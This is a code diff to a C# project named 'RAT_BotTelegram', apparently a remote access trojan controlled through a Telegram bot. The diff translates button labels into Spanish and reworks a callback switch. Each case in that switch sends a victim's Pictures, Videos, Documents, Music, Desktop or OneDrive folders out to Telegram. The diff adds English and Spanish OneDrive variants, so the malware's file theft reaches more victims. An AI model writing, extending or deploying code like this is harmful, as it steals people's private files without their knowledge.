@@ -116,7 +116,7 @@ namespace RAT_BotTelegram {
                     var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text: "|OneDrive| Get Pictures",
+                            text: "|OneDrive| Get Imagenes",
                             callbackData: "GetPicturesOE"),
                         InlineKeyboardButton.WithCallbackData(
                             text: "|OneDrive| Get Videos",
@@ -124,17 +124,17 @@ namespace RAT_BotTelegram {
 
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Documents",
+                            text:"|OneDrive| Get Documentos",
                             callbackData: "GetDocumentOE"),
                         InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Music",
+                            text:"|OneDrive| Get Música",
                             callbackData: "GetMusicOE"),
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Desktop",
+                            text:"|OneDrive| Get Escritorio",
                             callbackData: "getDesktopOE"),
                         InlineKeyboardButton.WithCallbackData(
-                            text:"Get all files from OneDrive",
+                            text:"|OneDrive| Todos los archivos",
                             callbackData: "getAllO")
                     }});
 
@@ -351,49 +351,31 @@ namespace RAT_BotTelegram {
             }
 
             var callbackQuery = callbackQueryEventArgs.CallbackQuery;
-
+            string user = Features.getUserName();
             switch (callbackQuery.Data) {
-                // User
-                case "GetPictures":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Pictures");
-                    break;
-                case "GetVideos":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Videos");
-                    break;
-                case "GetDocument":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
-                    break;
-                case "GetMusic":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Music");
-                    break;
-                case "GetDownload":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Documents");
-                    break;
-                case "GetDesktop":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Desktop");
-                    break;
+                
+                case "GetPictures": GetFilesTelegram(@"C:\Users\" + user + @"\Pictures");break;                          
+                case "GetVideos":   GetFilesTelegram(@"C:\Users\" + user + @"\Videos"); break;                         
+                case "GetDocument": GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;
+                case "GetMusic":    GetFilesTelegram(@"C:\Users\" + user + @"\Music");break;                    
+                case "GetDownload": GetFilesTelegram(@"C:\Users\" + user + @"\Documents");break;                 
+                case "GetDesktop":  GetFilesTelegram(@"C:\Users\" + user + @"\Desktop");break;
 
                 // OneDrive Español
+                case "GetPicturesOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Imágenes"); break;                          
+                case "GetVideosOE":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                          
+                case "GetDocumentOE": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documentos"); break;                          
+                case "GetMusicOE":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Musica");break;                          
+                case "GetDesktopOE":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
+                case "GetgetAllO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive"); break;
 
-                case "GetPicturesOE":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documentos");
-                    break;
-                case "GetVideosOE":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Videos");
-                    break;
-                case "GetDocumentOE":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
-                    break;
-                case "GetMusicOE":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Musica");
-                    break;
-                case "GetDesktopOE":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Escritorio");
-                    break;
-                case "GetgetAllO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive");
-                    break;
-               // Other
+                // OneDrive English
+                case "GetPicturesO": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Pictures"); break;                          
+                case "GetVideosO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                         
+                case "GetDocumentO": GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); break;                         
+                case "GetMusicO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); break;                         
+                case "GetDesktopO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
+                // Other
 
 
 
